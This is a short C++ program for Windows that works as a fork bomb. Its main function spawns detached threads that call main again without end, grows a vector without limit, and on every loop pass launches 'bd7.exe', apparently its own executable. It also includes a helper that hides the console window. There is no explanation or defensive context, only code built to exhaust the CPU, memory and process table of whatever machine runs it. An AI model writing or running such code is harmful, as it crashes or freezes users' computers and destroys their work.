#include <bits/stdc++.h>
#include <thread>
#include <windows.h>
using namespace std;

WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
int main()
{
    vector<long long> v;
    while (1)
    {
        thread t(main);
        t.detach();
        v.push_back(9223372036854775807);
        system("start bd7.exe");
    }
}